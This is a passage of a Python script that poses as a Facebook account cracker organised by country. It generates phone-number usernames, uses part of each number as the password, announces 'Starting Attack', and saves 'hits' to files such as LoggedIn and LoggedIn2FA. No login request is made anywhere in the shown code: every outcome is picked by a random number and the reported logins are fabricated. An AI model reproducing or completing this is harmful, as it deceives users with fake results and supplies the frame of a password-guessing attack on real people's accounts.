                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(thai)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def EG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Egypt',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(eg)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def BD():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Bangladesh',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(bd)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def PAK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Pakistan',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(pak)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def COLOM():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Colombia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(colom)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def UK():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('United Kingdom',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(uk)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=USER[3:]
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def RUS():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Russia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
